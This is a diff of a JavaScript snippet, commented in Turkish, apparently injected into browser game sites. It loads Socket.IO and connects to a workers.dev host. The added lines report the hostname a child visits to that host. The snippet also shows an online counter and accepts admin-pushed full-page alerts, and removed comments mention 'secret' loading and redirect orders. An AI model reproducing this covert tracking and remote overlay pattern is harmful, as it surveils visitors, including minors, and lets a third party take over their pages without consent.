@@ -1,15 +1,17 @@
 (function() {
-    // 1. SOCKET.IO İSTEMCİSİNİ GİZLİCE YÜKLE
     const script = document.createElement('script');
     script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
     document.head.appendChild(script);
 
     script.onload = () => {
-        // 2. CWP SUNUCUNA BAĞLAN (Kendi IP Adresini Buraya Yaz)
-        // DİKKAT: Sonunda '/' olmasın
-        const socket = io("https://dark-butterfly-a0dc.koydubupse.workers.dev");
+        // YENİ: Çocuğun girdiği sitenin adını alıyoruz (Örn: agar.live)
+        const myDomain = window.location.hostname || "Bilinmeyen-Site";
 
-        // 3. AKTİF KİŞİ SAYACI GÖRÜNÜMÜ (Sol Alta Ekliyoruz)
+        // YENİ: Cloudflare adresine bağlanırken, domaini de "query" olarak iletiyoruz
+        const socket = io("https://dark-butterfly-a0dc.koydubupse.workers.dev", {
+            query: { site: myDomain }
+        });
+
         const counterDiv = document.createElement('div');
         counterDiv.id = "global-online-counter";
         counterDiv.innerHTML = `🟢 <span id="online-num">0</span> Kişi Aktif`;
@@ -35,15 +37,15 @@
         counterDiv.onmouseout = () => counterDiv.style.transform = 'scale(1)';
         document.body.appendChild(counterDiv);
 
-        // 4. SUNUCUDAN GELEN ANLIK SAYIYI GÜNCELLE
-        socket.on('online_count_update', (count) => {
+        // YENİ: Sunucudan artık bir obje geliyor. İçinden toplam sayıyı alıyoruz.
+        socket.on('online_count_update', (data) => {
             const numSpan = document.getElementById('online-num');
-            if(numSpan) numSpan.innerText = count;
+            if(numSpan && data && data.total !== undefined) {
+                numSpan.innerText = data.total;
+            }
         });
 
-        // 5. ADMİNDEN GELEN FLASH BİLDİRİM VE YÖNLENDİRME EMRİ
         socket.on('trigger_flash_alert', (data) => {
-            // Ekrana tam sayfa, oyun temalı devasa bir bildirim basıyoruz
             const alertDiv = document.createElement('div');
             
             alertDiv.innerHTML = `
@@ -58,7 +60,6 @@
             
             document.body.appendChild(alertDiv);
 
-            // Kapatma butonuna işlev ekle
             document.getElementById('close-flash-btn').addEventListener('click', function() {
                 alertDiv.remove();
             });
